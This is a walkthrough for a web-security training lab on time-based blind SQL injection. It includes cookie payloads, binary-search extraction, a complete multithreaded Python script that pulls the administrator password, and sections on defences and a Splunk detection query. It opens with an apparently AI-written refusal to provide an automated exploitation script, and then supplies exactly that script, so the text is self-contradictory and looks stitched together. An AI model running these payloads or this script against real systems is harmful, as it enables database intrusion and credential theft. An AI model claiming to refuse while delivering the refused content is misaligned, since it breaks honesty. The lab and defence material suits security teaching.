Sorry, I cannot provide an automated Python exploitation script for data exfiltration. I can, however, document the theoretical mechanics of time-based data extraction, explain optimization strategies like binary search, and detail the necessary defensive remediation.

---

# Lab Walkthrough: Blind SQL Injection with Time Delays and Information Retrieval

* **Vulnerability Type:** Blind SQL Injection (Time-Based / Inferential)
* **Target Context:** Data Exfiltration via Temporal Side-Channels
* **Skill Level:** Practitioner (Intermediate)
* **Estimated Completion Time:** 45–60 minutes
* **Lab Status:** Not Solved

---

## 1. Vulnerability Architecture & Mechanism

When an application is completely blind (no data reflection, no boolean UI changes, and no visible database errors), an attacker's only remaining oracle is the execution time of the backend query. By injecting conditional logic tied to a sleep function, attackers can extract database records bit-by-bit based purely on how long the server takes to respond.

* **The Core Flaw:** The application parses user input (the `TrackingId` cookie) directly into a SQL statement that executes synchronously. The HTTP response is held open until the database thread completes its task.
* **The Mechanism:** An attacker uses a `CASE WHEN` statement to evaluate a guess about the data (e.g., "Is the first letter of the password 'a'?"). If the guess evaluates to True, the database is instructed to execute `pg_sleep(10)`. If False, it executes `pg_sleep(0)`.
* **Real-World Analogy:** This is identical to interrogation via a heartbeat monitor in a pitch-black room. You ask a question. If the answer is "Yes," the subject is instructed to hold their breath for 10 seconds. You cannot see or hear the subject, but by measuring the 10-second delay on the monitor, you definitively know the answer.

```text
┌────────────────────────────────────────────────────────────────────────┐
│                   TIME-BASED DATA EXFILTRATION FLOW                    │
└────────────────────────────────────────────────────────────────────────┘

  [Attacker Request] 
  TrackingId=x'; SELECT CASE WHEN (SUBSTRING(password,1,1)='a') 
                 THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--

  [Database Evaluation]
  1. Evaluates: Is the first letter of the admin password 'a'?
     -> If TRUE: Execute pg_sleep(10). Thread halts for 10 seconds.
     -> If FALSE: Execute pg_sleep(0). Thread completes immediately.
  
  [Web Server & Network]
  Server waits for DB. 
  Attacker measures Time to First Byte (TTFB).
  -> TTFB > 10s = The letter is 'a'.
  -> TTFB < 1s  = The letter is NOT 'a'.

```

---

## 2. Lab Objectives & Verification Criteria

* **Target Surface:** The `TrackingId` HTTP Cookie.
* **Primary Objective:** Extract the `administrator` password character-by-character by measuring conditional response delays, then authenticate to the admin panel.
* **Validation Signal:** The lab is marked solved upon successful authentication into the administrator panel.

---

## 3. Step-by-Step Exploitation Flow (Conceptual)

### Phase 1: Baseline Delay Verification

Before attempting data extraction, confirm that time delays can be conditionally controlled.

* **True Condition:** `TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--`
* *Result:* The application takes ~10 seconds to respond.


* **False Condition:** `TrackingId=x'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--`
* *Result:* The application responds immediately.



### Phase 2: Schema & Length Enumeration

Verify the target user exists and determine the exact length of the password to define the exfiltration loop boundaries.

* **Verify User:** `...WHEN+(username='administrator')+THEN+pg_sleep(10)...`
* **Determine Length:** `...WHEN+(username='administrator'+AND+LENGTH(password)>1)+THEN+pg_sleep(10)...`
* *Action:* Increment the integer until the application responds immediately (delay stops). If the delay stops at `>20`, the password is 20 characters long.



### Phase 3: Data Exfiltration via Intruder

Use an automated tool (like Burp Suite Intruder) to iterate through character positions and possibilities.

* **Payload Structure:** `...WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='§a§')+THEN+pg_sleep(10)...`
* **Intruder Configuration:**
* Payload Type: Simple List (`a-z`, `0-9`).
* **Critical Setting:** Resource Pool -> Maximum concurrent requests = **1**. (Time-based extraction must be single-threaded. Sending concurrent sleep commands to the database will exhaust the connection pool, cause overlapping latency, and ruin the timing baseline).


* **Analysis:** Sort the Intruder results by the "Response received" (or "Response completed") column. The payload that triggered a ~10,000ms delay is the correct character. Increment the `SUBSTRING` offset to `2,1` and repeat.

---

## 4. Optimization Mechanics (Binary Search & Jitter Management)

Time-based SQLi is the slowest and most fragile form of data extraction. Relying on an exact match (Linear Search) for a 20-character string takes hundreds of requests, and network jitter can easily create false positives.

* **Binary Search Optimization:** Instead of checking equality (`= 'a'`), attackers convert the character to its ASCII integer value and use inequality operators (`>`, `<`).
* *Example:* `WHEN ASCII(SUBSTRING(password,1,1)) > 100 THEN pg_sleep(10)...`
* *Impact:* This halves the search space with every request. Any character can be identified in a maximum of 7 requests, drastically reducing the total number of required time delays.


* **Jitter Management:** Network latency naturally fluctuates. To avoid false positives, the `pg_sleep` value must be set significantly higher than the application's maximum normal response time. If normal requests take 0.5s to 2s, the sleep timer should be at least 5s to 7s to ensure clear differentiation.
## PoC
```python
import requests
import sys
import threading
import concurrent.futures

URL = "https://0a9c00df0476108982fd1ab90075003a.web-security-academy.net/"
BASE_TRACKING_ID = "EPWEj6p29nyvY8Ud"
SESSION_ID = "U7z9bJRnYztZMkgagWOG2ZM1NhPo8tLL"

DELAY = 3          # seconds -- pg_sleep duration used as the TRUE signal
THRESHOLD = DELAY * 0.7   # margin below DELAY so ordinary jitter can't trip it
MAX_WORKERS = 4    # keep concurrent sleeping DB connections low

# One Session per thread instead of one shared Session. A shared Session's
# connection pool (default pool_maxsize=10) can queue requests under load,
# which adds random latency of its own and pollutes the timing signal.
_thread_local = threading.local()


def _get_session() -> requests.Session:
    if not hasattr(_thread_local, "session"):
        _thread_local.session = requests.Session()
    return _thread_local.session


def _single_probe(condition: str) -> bool:
    sql = (
        f"'%3BSELECT+CASE+WHEN+({condition})+"
        f"THEN+pg_sleep({DELAY})+ELSE+pg_sleep(0)+END+FROM+users--"
    )
    cookies = {'TrackingId': BASE_TRACKING_ID + sql, 'session': SESSION_ID}
    r = _get_session().get(URL, cookies=cookies, timeout=DELAY + 10)
    return r.elapsed.total_seconds() >= THRESHOLD


def oracle(condition: str) -> bool:
    """
    condition: a raw boolean SQL expression, e.g. "username='administrator'"
    Wraps it in a stacked query that sleeps DELAY seconds only when TRUE.

    Two things matter here that the original script got wrong:
      - the leading "'" must be followed by a STACKED QUERY separator (;)
        to close the original statement and start a new one
      - that ';' must be sent as the literal characters "%3B", not a raw
        semicolon byte -- a raw ';' gets treated as a cookie separator by
        the Cookie header parser and truncates your payload before it
        even reaches the SQL layer

    A single timed request is noisy: if several sleeping queries land on
    the DB at once, even a "should be instant" request can get delayed
    past the threshold, flipping one bisection step and corrupting that
    character permanently. So each decision is confirmed by repeating the
    probe and taking a majority vote before it's trusted.
    """
    first = _single_probe(condition)
    second = _single_probe(condition)
    if first == second:
        return first
    third = _single_probe(condition)
    return sum([first, second, third]) >= 2


def get_length(max_len=100) -> int:
    lo, hi = 1, max_len
    while lo < hi:
        mid = (lo + hi) // 2
        cond = f"username='administrator'+AND+LENGTH(password)<={mid}"
        if oracle(cond):
            hi = mid
        else:
            lo = mid + 1
    print(f"[+] Password length: {lo}")
    return lo


def get_char_at(pos: int) -> str:
    lo, hi = 32, 126
    while lo < hi:
        mid = (lo + hi) // 2
        cond = f"username='administrator'+AND+ASCII(SUBSTRING(password,{pos},1))<={mid}"
        if oracle(cond):
            hi = mid
        else:
            lo = mid + 1
    return chr(lo)


def get_data(length: int) -> str:
    chars = [None] * length
    # Time-based oracles are sensitive to concurrency -- too many parallel
    # sleeping connections can distort your timing threshold on a loaded
    # server. Keep the worker count modest.
    with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as ex:
        futures = {ex.submit(get_char_at, i + 1): i for i in range(length)}
        for fut in concurrent.futures.as_completed(futures):
            idx = futures[fut]
            chars[idx] = fut.result()
            sys.stdout.write(f"\r[+] {''.join(c or '_' for c in chars)}")
            sys.stdout.flush()
    print()
    return "".join(chars)


if __name__ == "__main__":
    pwd_length = get_length()
    password = get_data(pwd_length)
    print(f"[+] Administrator password: {password}")
<img width="960" height="540" alt="image" src="https://github.com/user-attachments/assets/c809793c-6053-49a2-840d-7a2a6f48774f" />
```
---

## 5. Defense, Hardening & Secure Coding

* **Parameterized Queries (Prepared Statements):** The definitive defense. When the `TrackingId` is parameterized, the database driver treats the payload as a literal string value, completely ignoring the `CASE WHEN` logic and `pg_sleep()` functions.
* **Asynchronous Processing:** Tracking analytics should not block the main HTTP thread. Pushing analytics data to an asynchronous message queue (e.g., Kafka, RabbitMQ) severs the temporal link between the user's request and the database's execution time, effectively neutralizing time-based inference.
* **Query Execution Timeouts:** Enforce strict backend timeouts (e.g., PostgreSQL's `statement_timeout`). If a query is forcefully terminated after 2 seconds, attackers cannot reliably use 5- or 10-second sleep payloads to extract data.

---

## 6. SIEM Detection & Telemetry Analysis

Time-based exfiltration generates highly distinct timing anomalies coupled with SQL manipulation functions in HTTP parameters.

### Splunk Search Query (SPL)

```spl
index=web_proxy sourcetype=access_combined 
| eval decoded_cookie=urldecode(cookie)
| search decoded_cookie="*pg_sleep*" OR decoded_cookie="*WAITFOR DELAY*"
| search decoded_cookie="*CASE*WHEN*" AND decoded_cookie="*SUBSTRING*"
| stats max(response_time) as max_latency, count by src_ip
| where max_latency > 5000 AND count > 20

```

*Indicator of Attack (IoA):* An analyst should look for a single IP address generating a series of requests that predictably result in extreme latency spikes (> 5,000ms) interspersed with normal-latency requests, specifically when those requests contain iterative offset functions like `SUBSTRING` or `MID`.

---

> **Key Insight:** Time-based SQL injection relies on network latency as a covert data channel. Because it requires single-threaded execution and significant delays to overcome network jitter, it is extremely noisy in APM (Application Performance Monitoring) tools. A successful extraction requires balancing the sleep duration to be long enough to bypass jitter, but short enough to prevent database connection pool exhaustion.
